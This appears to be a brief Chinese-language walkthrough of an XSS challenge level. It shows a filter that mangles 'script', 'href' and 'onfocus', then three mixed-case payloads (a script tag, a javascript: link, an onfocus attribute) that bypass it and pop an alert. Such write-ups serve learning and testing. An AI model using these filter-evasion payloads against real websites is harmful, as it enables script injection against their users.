测试

```
onfocus <script> <a href=javascript:alert('xss')>
```

 得到

```
o_nfocus <scr_ipt> <a hr_ef=javascript:alert('xss')>
```





onfocus script href都被过滤



尝试大小写绕过

```
"> <scrIpt>alert('xss');</scrIpt><"
">  <a Href=javascript:alert('xss')> <"
"  onfocus=javascript:alert('xss');  "

三种都可过关
```

